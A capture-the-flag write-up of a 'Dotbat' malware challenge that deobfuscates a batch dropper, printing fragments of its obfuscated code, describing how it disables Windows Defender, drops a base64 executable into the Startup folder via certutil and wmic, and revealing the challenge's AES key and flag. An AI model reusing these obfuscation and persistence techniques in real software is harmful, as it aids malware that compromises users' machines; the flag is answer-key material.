# Dotbat - hacktivitycon 2021

- Category: Malware
- Points: 466
- Solves: 56
- Solved by: Mindlæss

## Description

This file is a dotbat, literally! Don't believe me? Try it! 

## Solution

### Stage 1
First things first, the file has the .mpga extension... is it an audio? Let's be sure running `file`:

```
$ file dotbat.mpga 
dotbat.mpga: Little-endian UTF-16 Unicode text, with very long lines, with no line terminators
```

Well, no audio files this time. It says the file contains text, let's see what's inside!

```
挦獬਍╀啰求捉縺㤸㠬┳倥䉕楌㩣㕾ㄬ䌥潈⁞景╞畐求䍉縺㘴ㄬ┶⁦ഠ帊瀥䉕䥬㩃ㅾⰴ┱䱞瀥䉕楬㩃㕾ⰵ㜱帥瀥扵䥬㩣㑾ㄬ‥ഠ匊瑅删㵞杊╞啰䱂捉縺㌱ㄬ帥瑧塇╺啰䱂捉縺ⰴ┱╷啰䱂捉縺ㄱㄬ帥浨瀥䉕䥌㩣ㅾⰰ┱卞䡞幉⁏਍爥縺ⰸ┱╥㩲㑾ㄬ‥慮爥縺㈱ㄬ攥㴠┠㩲ㅾⰰ┱╡㩲㑾ㄬ挥爥縺ㄱㄬ‥╯㩲ㅾⰰ┱爥縺㌱ㄬ┥㩲㡾ㄬ挥╡㩲㑾ㄬ漥⁲爥縺〱ㄬ礥┠㩲ㅾⰲ┱潯爥縺㈱ㄬ㠥㔲ഠ┊㩲㡾ㄬ攥爥縺ⰴ┱┠㩲ㅾㄬ┥㩲㉾ㄬ┥㩲㑾ㄬ┥㩲ㅾⰱ┱爥縺㌱ㄬ┥㩲ㅾⰰ┱㴠┠㩲ㅾⰱ┱爥縺ⰴ┱爥縺ⰴ┱╰㩲㡾ㄬ㨥⼯爥縺ⰱ┱爥縺ⰲ┱爥縺ⰴ┱爥縺ㄱㄬ┥㩲ㅾⰳ┱爥縺〱ㄬ⸥潣爥縺㈱ㄬ⼥爥縺㈱ㄬ漥╯㩲ㅾⰲ┱㈸⼵爥縺〱ㄬ愥爥縺ⰴ┱╣㩲ㅾⰱ┱漭爥縺〱ㄬ春爥縺㌱ㄬ┥㩲㡾ㄬ挥╡㩲㑾ㄬ漥⵲爥縺㈱ㄬ愥敤┭㩲㉾ㄬ渥瀭╹㩲㑾ㄬ┥㩲ㅾⰱ┱湯†਍湞敞爥縺ⰴ┱ㅞ⁞爥縺ⰸ┱䕞爥縺ⰸ┱爥縺㐱ㄬ┥㩲ㅾⰶ┱幯⁎帾啎䱞㈠☾

...

䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁਍捅╞㩒ㅾⰱ┱別縺㜱ㄬ帥┠整灭㐶㸥┾潰瑯╨ഠ猊瑥琠浥㙰㴴䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁਍捅╞㩒ㅾⰱ┱別縺㜱ㄬ帥┠整灭㐶㸥┾潰瑯╨ഠ猊瑥琠浥㙰㴴䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁਍捅╞㩒ㅾⰱ┱別縺㜱ㄬ帥┠整灭㐶㸥┾潰瑯╨ഠ猊瑥琠浥㙰㴴䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁䅁਍捅╞㩒ㅾⰱ┱別縺㜱ㄬ帥┠整灭㐶㸥┾潰瑯╨ഠ攊幣爥縺ㄱㄬ帥⁯ⵞⴭ席席久䑞䌠剅幔爥縺㘱ㄬ帥╆㩲ㅾⰶ┱䍞䅞呞ⵅ席席ⴭ㸾瀥潯桴‥਍散瑲瑵汩ⴠ⁦搭捥摯⁥瀥潯桴‥瀥潯桴‥਍楴敭畯⁴‱਍海捩瀠潲散獳挠污⁬牣慥整┠潰瑯╨ഠ猊瑥潬慣⁬湥扡敬硥整獮潩獮ഠ昊牯⼠⁦┥⁡別縺㘱ㄬ渥⠠帧慔別縺㐱ㄬ䬥䱞別縺㘱ㄬ┥㩒ㅾⰴ┱╞㩒㑾ㄬ‥⽞乞╞㩒ㅾⰱ┱⁞䘯別縺ⰲ┱∠別縺㘱ㄬ䴥╡㩒㕾ㄬ䔥慮別縺㈱ㄬ攥䔠⁑╗㩒㉾ㄬ严╄㩒ㅾⰶ┱⹲╅㩒㙾ㄬ攥✢ ╤㩒ㅾⰷ┱┠㩒㉾ㄬ䘥┠愥㴠‽╗㩒㉾ㄬ严╄㩒ㅾⰶ┱⹲╅㩒㙾ㄬ攥⠠䕤⁌┯㩒ㅾⰴ┱⼠⁑䘯∠縥う•┦異求䍉縺㐷㤬☥攠硞╞㩲㉾ㄬ┥㩲㑾ㄬ⤥帠汥爥縺ⰸ┱⁅帨爥縺ⰵ┱呯╞㩲ㅾⰷ┱䴠剞乞爥縺〱ㄬ帥爥縺ⰴ┱ ਍
```
Alright, clean and understandable code that we can normally read... of course I'm kidding. Since there's nothing readable, I decided to run `strings` to see if there was something "hidden".

```
$ strings dotbat.mpga 
&cls
@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f  
^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%  

...

d%R:~17,1% %R:~2,1%F %%a == W%R:~2,1%ND%R:~16,1%r.E%R:~6,1%e (dEL /%R:~14,1% /Q /F "%~F0" &%puBlIC:~74,9%& e^x^%r:~2,1%%r:~4,1%) ^el%r:~8,1%E (^%r:~5,1%oT^%r:~17,1% M^R^N%r:~10,1%^%r:~4,1%) 
```

What the malware does isn't completely clear yet, but at least we can recognize the characters! Let's save the `strings` output in a file so that we can study it properly and head into stage 2.

### Stage 2
Let's clear this file a bit before diving into reading it. For those who don't know (me, for example), in batch the syntax `%variable_name:~x,y%` with strings lets you take only y characters of that string starting from the x-th. So for example `%PUBLic:~5,1%` takes one character starting at public[5], so "e". 
Also, the caret (^) is just an escape character in batch, so we can take those off.

Once all the job is done, we can finally understand what this file does. It seems like it's messing with the registry, disabling Windows Defender and doing other spooky stuff. Let's nerf it by deleting all those lines.
After this, we are left with some echos of Base-64 encoded strings in a `windir.exe` file. After that, `certutil` is run to decode the Base-64 and so the process can finally be started with the line `wmic process call create %pooth%`.

Of course, we want the malware to do the job for us, so we delete all the lines interacting with the registry and those after the file decoding and then we launch the .bat file. This will create and decode the file in `%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`. Now we can copy that file somewhere else and delete the copy in the Start Up directory (we don't want it to run next time we power on our PC). 

### Stage 3
Again, let's run `file` to see what we are dealing with.

```
$ file stage2_decoded 
stage2_decoded: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Since it is .Net assembly, we can inspect it in dnSpy. First thing we notice is that its original name was scrapdawg.exe.
Then, heading into the `main` function we can see that it doesn't do anything harmful, it just decripts a ciphertext using aes and then, if a condition is met, prints it. Well, let's make it a bit more comfortable and remove the `if` statement so that the code will look now like this:
```
private static void Main(string[] args)
{
	string key = "b14ca5898a4e4133bbce2ea2315a1916";
	string cipherText = "o7oReaGhEfveURcDvHbErcud9+MjzWvloHZ8lIRu6axzfAbyUUaSthwCfc+hkmgR";
	Console.WriteLine(AesOperation.DecryptString(key, cipherText));
}
```

Now let's run it in cmd and see what it decrypts.

```
> .\stage2_decodedF
flag{3a75349c5d614587898c785d88da3582}
```